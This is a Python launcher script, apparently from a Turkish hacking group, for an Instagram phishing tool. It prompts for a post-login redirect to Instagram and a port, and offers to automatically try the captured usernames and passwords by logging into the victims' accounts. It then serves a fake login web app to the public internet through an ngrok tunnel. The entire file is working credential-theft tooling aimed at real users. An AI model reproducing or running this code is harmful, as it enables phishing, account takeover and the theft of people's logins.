# coding=utf-8
#!/usr/bin/env python3

__author__ = "Hichigo TurkHackTeam"
__license__ = "GPLv3"
__version__ = "1.0.0"

from libs.helpers import error, info, ask, success
from libs.helpers import report_account, clear_screen, print_logo
from colorama import init
from os import _exit
from libs.website import website_app, SETTINGS
from pyngrok import ngrok, exception
from libs.ig_login import login_to_account

try:
    from cheroot.wsgi import Server as WSGIServer, PathInfoDispatcher
except ImportError:
    from cherrypy.wsgiserver import CherryPyWSGIServer as WSGIServer, WSGIPathInfoDispatcher 

http_server = None
http_server_thread = None
public_url = None
web_url = None

def main():
    clear_screen()
    print_logo()
    redirect_url = ask("Giriş yapıldıktan sonra nereye yönlendirilsin (Varsayılan: https://www.instagram.com)")
    port = ask("Web sunucusu hangi port'u kullansın (Varsayılan: 80)")
    
    if (port != "" and (port.isdigit()) == False):
        error("Hatalı giriş!")
        _exit(0)

    try_accounts = ask("Girilen kullanıcılar denensin mi (Varsayılan: Hayır) [E/H]")
    print("")

    if ((try_accounts != "") and (try_accounts.lower() != "e") and (try_accounts.lower() != "h")):
        error("Hatalı giriş!")
        _exit(0)

    if (redirect_url != ""):
        info("Yönlendirme '{0}' olarak ayarlandı!".format(redirect_url))
        SETTINGS["REDIRECT_URL"] = redirect_url
    else:
        info("Varsayılan yönlendirme adresi kullanılıyor!")
        SETTINGS["REDIRECT_URL"] = "https://www.instagram.com"

    if (port != ""):
        info("Sunucunun web portu '{0}' olarak ayarlandı!".format(port))
        SETTINGS["PORT"] = int(port)
    else:
        info("Varsayılan sunucu portu kullanılıyor!")
        SETTINGS["PORT"] = 80

    if (try_accounts != ""):
        if (try_accounts.lower() == "e"):
            info("Sunucuya girilen kullanıcılar giriş yapılarak denenecektir!")
            SETTINGS["TRY_ACCOUNTS"] = True

    print("")
    success("NGROK servisi başlatılıyor!")
    public_url = ngrok.connect()
    web_url = ngrok.connect(SETTINGS["PORT"], "http")
    success("Port yönlendirme başarılı!")

    print("")
    success("Web sunucusu {0} adresinde açıldı!".format(web_url))
    print("")
    http_server = WSGIServer(('0.0.0.0', SETTINGS["PORT"]), PathInfoDispatcher({'/': website_app}))
    http_server.start()

if __name__ == "__main__":
    init(convert=True)
    try:
        main()
    except KeyboardInterrupt:
        clear_screen()
        success("Program kapatılıyor!")
        if (http_server): http_server.stop()
        if (public_url): ngrok.disconnect(public_url)
        _exit(0)
    except exception.PyngrokError as e:
        error("NGROK Servisi başlatılamadı! Internet bağlantınızı kontrol edin! ({})".format(e))
        if (public_url): ngrok.disconnect(public_url)
        if (http_server): http_server.stop()
        _exit(0)
    except:
        if (public_url): ngrok.disconnect(public_url)
        http_server.stop()